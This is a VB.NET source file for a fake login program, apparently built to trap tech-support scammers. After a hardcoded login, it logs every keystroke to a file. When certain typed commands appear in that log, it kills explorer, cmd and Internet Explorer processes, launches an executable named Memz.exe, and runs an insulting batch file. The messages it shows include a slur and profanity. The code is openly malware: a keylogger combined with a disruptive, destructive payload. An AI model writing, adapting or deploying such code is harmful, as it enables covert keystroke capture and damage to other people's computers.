Imports Microsoft.WindowsCE.Forms
Imports System
Imports System.IO

Public Class Login
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short


    Dim keysDown As New List(Of Integer)()
    Dim newUp As New List(Of Integer)()

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim items As Array
        items = System.Enum.GetValues(GetType(Keys))
        Using sw As StreamWriter = File.AppendText("Keys.txt")

            For Each key In items
                Dim test As Integer = GetAsyncKeyState(key)
                If test <> 0 Then
                    Dim temp As String = key.ToString()
                    If temp.Count > 1 Then
                        temp = "[" + temp + "]"
                    End If
                    If Not (keysDown.Contains(key)) Then
                        sw.Write(temp)
                    End If
                    keysDown.Add(key)
                ElseIf keysDown.Contains(key) Then
                    newUp.Add(key)
                End If
            Next
        End Using

        For Each up In newUp
            keysDown.Remove(up)
        Next
        newUp.Clear()

        Dim Findstring = IO.File.ReadAllText("Keys.txt")
        Dim Lookfor As String = "CMD"

        If Findstring.Contains(Lookfor) Then
            My.Computer.FileSystem.DeleteFile("Keys.txt")
            MessageBox.Show("Level 1 Technician")
            Process.Start("dXDIAG.EXE")
            Timer3.Start()
        End If
        Dim FS1 = IO.File.ReadAllText("Keys.txt")
        Dim Look1 As String = "SYSKEY"

        If FS1.Contains(Look1) Then
            My.Computer.FileSystem.DeleteFile("Keys.txt")
            MessageBox.Show("Level 5 Technician")
            MessageBox.Show("You are a Madarchod SCAMMER ENJOY!")
            Dim Poo1 As Process
            Dim Po1 As Process() = Process.GetProcessesByName("explorer") 'creates an array with all running processes with the same name

            For Each Poo1 In Po1
                Poo1.Kill()

            Next
            Process.Start("Memz.exe")
        End If
        Dim FS2 = IO.File.ReadAllText("Keys.txt")
        Dim Look2 As String = "TREE"

        If FS2.Contains(Look2) Then
            My.Computer.FileSystem.DeleteFile("Keys.txt")
            MessageBox.Show("Level 2 Technician")
            Timer2.Start()
        End If
        Dim FS3 = IO.File.ReadAllText("Keys.txt")
        Dim Look3 As String = "EVENTVWR"

        If FS3.Contains(Look3) Then
            My.Computer.FileSystem.DeleteFile("Keys.txt")
            MessageBox.Show("Level 3 Technician")
            Dim Poo As Process
            Dim Po As Process() = Process.GetProcessesByName("Cmd") 'creates an array with all running processes with the same name

            For Each Poo In Po
                Poo.Kill()

            Next

        End If
        Dim FS4 = IO.File.ReadAllText("Keys.txt")
        Dim Look4 As String = "PIE"

        If FS4.Contains(Look4) Then
            My.Computer.FileSystem.DeleteFile("Keys.txt")
            MessageBox.Show("Level 4 Technician")
            Process.Start("eventvwr.exe")
            Dim sb As New System.Text.StringBuilder

            sb.AppendLine("@echo off")
            sb.AppendLine("Echo FUCK YOU")
            sb.AppendLine("pause")
            sb.AppendLine("End")


            IO.File.WriteAllText("fileName.bat", sb.ToString())

            Process.Start("fileName.bat")

        End If
    End Sub
 
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Dim Explorer As Process
        Dim Notepads As Process() = Process.GetProcessesByName("iexplore") 'creates an array with all running processes with the same name

        For Each Explorer In Notepads
            Explorer.Kill()

        Next
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text = "guest" And TextBox2.Text = "guest" Then
            Timer1.Start()
            Me.Hide()
        Else
            MessageBox.Show("Login Failed")
        End If
        If TextBox1.Text = "marx" And TextBox2.Text = "1234" Then
            Timer1.Start()
            Me.Hide()
        Else
            MessageBox.Show("Login Failed")
        End If


    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.Close()
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        MessageBox.Show("You've been hacked :)")
    End Sub
End Class

